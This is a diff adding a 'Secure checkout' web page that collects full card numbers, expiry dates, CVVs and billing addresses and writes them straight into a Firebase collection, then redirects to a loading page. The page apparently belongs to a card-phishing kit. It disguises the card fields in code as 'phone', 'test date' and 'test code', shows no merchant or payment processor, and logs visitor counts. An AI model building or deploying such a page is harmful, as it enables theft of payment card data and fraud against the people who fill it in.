@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body class="checkout-body">
+
+<div class="checkout-container">
+
+    <div class="checkout-header">
+        <div class="lock">🔒</div>
+        <div>
+            <h1>Secure checkout</h1>
+        </div>
+    </div>
+
+    <div class="checkout-box">
+
+        <form id="paymentForm">
+
+            <div class="section-title">
+                Card details
+            </div>
+
+            <div class="field">
+                
+
+                <input
+                    id="phone"
+                    type="text"
+                    placeholder="0000 0000 0000 0000"
+                    maxlength="19"
+                    inputmode="numeric"
+                    autocomplete="off"
+                    required
+                >
+
+                <div class="hint" id="phoneHint">
+                    0 / 16 digits
+                </div>
+            </div>
+
+            <div class="row">
+
+                <div class="field">
+                    <label>Expiry date</label>
+
+                    <input
+                        id="testDate"
+                        type="text"
+                        placeholder="MM/YY"
+                        maxlength="5"
+                        inputmode="numeric"
+                        autocomplete="off"
+                        required
+                    >
+
+                    <div class="hint">
+                        MM/YY
+                    </div>
+                </div>
+
+                <div class="field">
+                    <label>CVV</label>
+
+                    <input
+                        id="testCode"
+                        type="text"
+                        placeholder="CVV"
+                        maxlength="3"
+                        inputmode="numeric"
+                        autocomplete="off"
+                        required
+                    >
+
+                    <div class="hint">
+                        3 or 4 digits
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="divider"></div>
+
+            <div class="section-title">
+                Billing address
+            </div>
+
+            <div class="field">
+                <label>Street address</label>
+
+                <input
+                    id="address"
+                    type="text"
+                    placeholder="123 Main Street"
+                    required
+                >
+            </div>
+
+            <div class="row">
+
+                <div class="field">
+                    <label>City</label>
+
+                    <input
+                        id="city"
+                        type="text"
+                        placeholder="City"
+                        required
+                    >
+                </div>
+
+                <div class="field">
+                    <label>State</label>
+
+                    <input
+                        id="state"
+                        type="text"
+                        placeholder="CA"
+                        required
+                    >
+                </div>
+
+            </div>
+
+            <div class="field">
+                <label>ZIP code</label>
+
+                <input
+                    id="zip"
+                    type="text"
+                    placeholder="00000"
+                    maxlength="5"
+                    inputmode="numeric"
+                    required
+                >
+
+                <div class="hint">
+                    5 digits
+                </div>
+            </div>
+
+            <button
+                class="primary-btn"
+                id="submitBtn"
+                type="submit"
+            >
+                Submit
+            </button>
+
+            <div id="message" class="message"></div>
+
+        </form>
+
+    </div>
+
+    <div class="checkout-footer"></div>
+
+</div>
+
+<script type="module">
+
+import { db } from "./firebase-config.js";
+
+import {
+    collection,
+    addDoc,
+    serverTimestamp
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const form = document.getElementById("paymentForm");
+
+const phone = document.getElementById("phone");
+const testDate = document.getElementById("testDate");
+const testCode = document.getElementById("testCode");
+
+const address = document.getElementById("address");
+const city = document.getElementById("city");
+const state = document.getElementById("state");
+const zip = document.getElementById("zip");
+
+const button = document.getElementById("submitBtn");
+const message = document.getElementById("message");
+
+const phoneHint = document.getElementById("phoneHint");
+
+// PHONE NUMBER FORMAT
+
+phone.addEventListener("input", () => {
+
+    const numbers = phone.value
+        .replace(/\D/g, "")
+        .slice(0, 16);
+
+    phone.value = numbers
+        .replace(/(.{4})/g, "$1 ")
+        .trim();
+
+    phoneHint.textContent =
+        numbers.length + " / 16 digits";
+
+});
+
+// TEST DATE FORMAT
+
+testDate.addEventListener("input", () => {
+
+    let value = testDate.value
+        .replace(/\D/g, "")
+        .slice(0, 4);
+
+    if (value.length > 2) {
+
+        value =
+            value.slice(0, 2) +
+            "/" +
+            value.slice(2);
+
+    }
+
+    testDate.value = value;
+
+});
+
+// TEST CODE FORMAT
+
+testCode.addEventListener("input", () => {
+
+    testCode.value = testCode.value
+        .replace(/\D/g, "")
+        .slice(0, 4);
+
+});
+
+// ZIP FORMAT
+
+zip.addEventListener("input", () => {
+
+    zip.value = zip.value
+        .replace(/\D/g, "")
+        .slice(0, 5);
+
+});
+
+// TEST DATE VALIDATION
+
+function validTestDate(value) {
+
+    const match = value.match(
+        /^(0[1-9]|1[0-2])\/\d{2}$/
+    );
+
+    return Boolean(match);
+
+}
+
+// VISITOR TRACKING
+
+async function trackVisitor() {
+
+    try {
+
+        const today = new Date()
+            .toLocaleDateString("en-CA");
+
+        if (!sessionStorage.getItem("visitorTracked")) {
+
+            await addDoc(
+                collection(db, "visitors"),
+                {
+                    date: today,
+                    createdAt: serverTimestamp()
+                }
+            );
+
+            sessionStorage.setItem(
+                "visitorTracked",
+                "true"
+            );
+
+        }
+
+        await addDoc(
+            collection(db, "pageViews"),
+            {
+                page: "information",
+                date: today,
+                createdAt: serverTimestamp()
+            }
+        );
+
+    } catch (error) {
+
+        console.error(
+            "Visitor tracking error:",
+            error
+        );
+
+    }
+
+}
+
+trackVisitor();
+
+// FORM SUBMISSION
+
+form.addEventListener("submit", async (e) => {
+
+    e.preventDefault();
+
+    message.textContent = "";
+    message.className = "message error";
+
+    const phoneNumber = phone.value
+        .replace(/\D/g, "");
+
+    if (!/^\d{16}$/.test(phoneNumber)) {
+
+        message.textContent =
+            "Please enter a 16-digit phone number.";
+
+        return;
+
+    }
+
+    if (!validTestDate(testDate.value)) {
+
+        message.textContent =
+            "Please enter a valid test date.";
+
+        return;
+
+    }
+
+    if (!/^\d{3,4}$/.test(testCode.value)) {
+
+        message.textContent =
+            "Please enter a 3 or 4 digit test code.";
+
+        return;
+
+    }
+
+    if (!/^\d{5}$/.test(zip.value)) {
+
+        message.textContent =
+            "Please enter a valid ZIP code.";
+
+        return;
+
+    }
+
+    button.disabled = true;
+    button.textContent = "Submitting...";
+
+    const data = {
+
+        phoneNumber: phoneNumber,
+
+        testDate: testDate.value,
+
+        testCode: testCode.value,
+
+        address: address.value.trim(),
+
+        city: city.value.trim(),
+
+        state: state.value.trim(),
+
+        zip: zip.value,
+
+        status: "Submitted",
+
+        createdAt: serverTimestamp()
+
+    };
+
+    try {
+
+        await addDoc(
+            collection(db, "demoSubmissions"),
+            data
+        );
+
+        message.className = "message success";
+
+message.textContent =
+    "✅ Information submitted successfully!";
+
+form.reset();
+
+phoneHint.textContent = "0 / 16 digits";
+
+// Open demo loading page after successful Firebase save
+// Track successful submissions
+let submitCount = Number(
+    sessionStorage.getItem("submitCount") || "0"
+);
+
+// Increase count
+submitCount++;
+
+// Save count
+sessionStorage.setItem(
+    "submitCount",
+    String(submitCount)
+);
+
+// Go to loading page
+window.location.replace("loading.html");
+
+    } catch (error) {
+
+        console.error(
+            "Submission error:",
+            error
+        );
+
+        message.className = "message error";
+
+        message.textContent =
+            "Submission failed. Please try again.";
+
+    } finally {
+
+        button.disabled = false;
+        button.textContent = "Submit";
+
+    }
+
+});
+
+</script>
+
+</body>
+</html>
